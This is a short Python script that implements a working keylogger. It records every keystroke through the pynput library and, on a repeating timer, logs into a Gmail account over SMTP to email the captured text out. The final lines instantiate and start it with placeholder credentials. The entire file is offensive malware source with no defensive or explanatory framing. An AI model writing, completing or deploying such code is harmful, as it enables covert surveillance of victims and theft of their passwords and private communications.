import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time, email, password):
        self.log = ""
        self.interval = time
        self.email = email
        self.password = password   
        
    def capture_stroke(self, key):
        try:
            keystroke = str(key.char)
        except AttributeError:
            if key == key.space or key == key.enter:
                keystroke = " "
            elif key == key.backspace:
                keystroke = ("#")
            else:
                keystroke = " " + str(key) + " " 
        self.log = self.log + keystroke

    def sml(self):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, self.log)
        server.quit()
        self.log = ""
        timer = threading.Timer(10, self.sml)
        timer.start()


    def start(self):
        stroker = pynput.keyboard.Listener(on_press=self.capture_stroke)
        with stroker:
            self.sml()
            stroker.join()
key = Keylogger(180, "username", "password")# username- mail_id 
key.start()